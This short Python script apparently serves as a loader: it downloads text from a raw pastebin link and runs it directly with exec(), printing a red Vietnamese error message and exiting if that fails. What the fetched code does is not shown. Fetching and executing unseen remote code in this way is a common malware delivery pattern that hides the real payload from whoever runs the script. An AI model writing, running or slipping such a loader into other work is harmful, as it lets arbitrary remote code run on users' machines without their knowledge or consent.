import requests
try:
  HDTB=requests.get("https://pastebin.com/raw/N5qLuKcC").text
  exec(HDTB)
except:
  print("\033[1;31mĐã xảy ra lỗi!!!")
  exit()